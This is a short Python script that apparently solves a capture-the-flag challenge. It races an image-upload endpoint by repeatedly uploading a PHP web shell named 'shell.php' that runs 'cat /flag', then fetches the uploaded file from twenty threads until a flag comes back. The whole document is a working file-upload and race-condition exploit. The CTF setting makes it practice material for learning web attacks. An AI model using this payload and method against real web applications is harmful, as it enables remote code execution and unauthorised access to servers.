import requests
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed

BASE_URL = "http://docker.qingcen.net:44132/"
PAYLOAD = b"<?php system('cat /flag');?>"
STOP = threading.Event()

def worker():
    with requests.Session() as s:
        while not STOP.is_set():
            try:
                r = s.post(
                    f"{BASE_URL}/",
                    files={"image": ("shell.php", PAYLOAD, "application/x-php")},
                    timeout=3,
                )
                path = r.json().get("file_url")
                if not path:
                    continue

                text = s.get(f"{BASE_URL}/{path.lstrip('/')}", timeout=3).text.strip()
                if text.startswith("flag{") and text.endswith("}"):
                    STOP.set()
                    return text
            except (requests.RequestException, ValueError):
                pass

def main():
    with ThreadPoolExecutor(max_workers=20) as pool:
        futures = [pool.submit(worker) for _ in range(20)]
        for f in as_completed(futures):
            flag = f.result()
            if flag:
                print(flag)
                return

if __name__ == "__main__":
    main()